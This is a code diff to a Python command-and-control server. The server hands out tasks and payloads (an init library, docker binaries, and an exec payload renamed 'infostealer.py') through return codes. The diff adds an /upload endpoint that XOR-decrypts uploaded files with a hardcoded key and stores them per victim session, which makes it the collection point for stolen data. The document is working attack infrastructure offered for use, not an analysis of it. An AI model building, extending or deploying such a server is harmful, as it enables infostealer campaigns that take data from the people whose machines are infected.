@@ -2,13 +2,21 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 import json
 import base64
 import os
+import cgi
+from pathlib import Path
 
 # Hardcoded task configuration
-RET_CODE = 0  # Change to 0, 1, 2, 3, or 9 to simulate different responses
+RET_CODE = 2  # Change to 0, 1, 2, 3, or 9 to simulate different responses
 INIT_FILE_PATH = "init_payload.so"
-PYTHON_EXEC_FILE = "exec_payload.py"
+PYTHON_EXEC_FILE = "infostealer.py"
 DOCKERD_PATH = "dockerd.bin"
 DOCKER_INIT_PATH = "docker-init.bin"
+XOR_KEY     = b"mysecretpassword"
+UPLOAD_ROOT = Path("uploads")
+UPLOAD_ROOT.mkdir(exist_ok=True)
+
+def xor_decrypt(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 # Define the YAML content directly in memory
 YAML_CONTENT = f"""
@@ -16,7 +24,7 @@ YAML_CONTENT = f"""
 """
 
 class C2Handler(BaseHTTPRequestHandler):
-
+    
     def do_GET(self):
         if self.path == "/getData":
             content = YAML_CONTENT.encode("utf-8")
@@ -27,9 +35,11 @@ class C2Handler(BaseHTTPRequestHandler):
             self.wfile.write(content)
         else:
             self.send_error(404, "Not Found")
-
-
     def do_POST(self):
+
+        if self.path == "/upload":
+            return self.handle_upload()
+        
         content_len = int(self.headers.get('Content-Length', 0))
         post_body = self.rfile.read(content_len).decode()
 
@@ -47,6 +57,7 @@ class C2Handler(BaseHTTPRequestHandler):
             self.send_response(201)
             self.end_headers()
             return
+        
 
         response = {"ret": RET_CODE}
 
@@ -79,8 +90,93 @@ class C2Handler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(response_bytes)
 
+    def handle_upload(self):
+        ctype, pdict = cgi.parse_header(self.headers.get('Content-Type', ''))
+        if ctype != 'multipart/form-data':
+            self.send_error(400, "Expected multipart/form-data")
+            return
+
+        fs = cgi.FieldStorage(
+            fp=self.rfile,
+            headers=self.headers,
+            environ={
+                'REQUEST_METHOD': 'POST',
+                'CONTENT_TYPE': self.headers['Content-Type'],
+            }
+        )
+
+        # ← new checks start here
+        if 'file' not in fs:
+            self.send_error(400, "No file field in form")
+            return
+
+        file_item = fs['file']
+        if not file_item.filename:
+            self.send_error(400, "No file uploaded")
+            return
+        # ← new checks end here
+
+        session_id = fs.getvalue('session_id', 'session1234')
+
+        encrypted = file_item.file.read()
+        decrypted = xor_decrypt(encrypted, XOR_KEY)
+
+        dest_dir  = UPLOAD_ROOT / session_id
+        dest_dir.mkdir(exist_ok=True)
+        save_path = dest_dir / f"{session_id}_{file_item.filename}"
+        save_path.write_bytes(decrypted)
+
+        msg = f"Saved to {save_path}"
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(msg)))
+        self.end_headers()
+        self.wfile.write(msg.encode())
+
+'''
+    def handle_upload(self):
+        # parse multipart/form-data
+        ctype, pdict = cgi.parse_header(self.headers.get('Content-Type', ''))
+        if ctype != 'multipart/form-data':
+            self.send_error(400, "Expected multipart/form-data")
+            return
+
+        fs = cgi.FieldStorage(
+            fp=self.rfile,
+            headers=self.headers,
+            environ={
+                'REQUEST_METHOD': 'POST',
+                'CONTENT_TYPE': self.headers['Content-Type'],
+            }
+        )
+
+        session_id = fs.getvalue('session_id', 'session1234')
+        file_item  = fs['file']  # <input name="file" …>
+        if not file_item or not file_item.filename:
+            self.send_error(400, "No file uploaded")
+            return
+
+        # decrypt & save
+        encrypted = file_item.file.read()
+        decrypted = xor_decrypt(encrypted, XOR_KEY)
+
+        dest_dir  = UPLOAD_ROOT / session_id
+        dest_dir.mkdir(exist_ok=True)
+        save_path = dest_dir / f"{session_id}_{file_item.filename}"
+        save_path.write_bytes(decrypted)
+
+        # reply
+        msg = f"Saved to {save_path}"
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(msg)))
+        self.end_headers()
+        self.wfile.write(msg.encode())
+'''
+
+
 if __name__ == "__main__":
-    server_address = ("0.0.0.0", 80)
+    server_address = ("0.0.0.0", 1337)
     httpd = HTTPServer(server_address, C2Handler)
-    print("C2 server running on http://0.0.0.0:80")
+    print("C2 server running on http://0.0.0.0:1337")
     httpd.serve_forever()
